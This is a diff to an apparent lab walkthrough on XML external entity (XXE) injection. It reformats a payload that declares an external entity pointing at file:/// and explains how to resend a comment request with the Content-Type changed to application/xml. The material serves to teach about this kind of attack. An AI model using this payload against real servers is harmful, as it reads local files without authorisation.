@@ -114,7 +114,11 @@ Edit the body with:
 Post a comment and Locate the query to content-type in the Network tab and click on Edit and Resend.
 Edit the body with:
 
- <?xml version="1.0"?><!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]><comment><text>&xxe;</text></comment>
+ <?xml version="1.0"?>
+<!DOCTYPE cat [
+<!ENTITY root SYSTEM "file:///">
+]>
+<comment> <text>&root;</text></comment>
 
  and edit the header Content-Type: application/json with Content-Type: application/xml
 
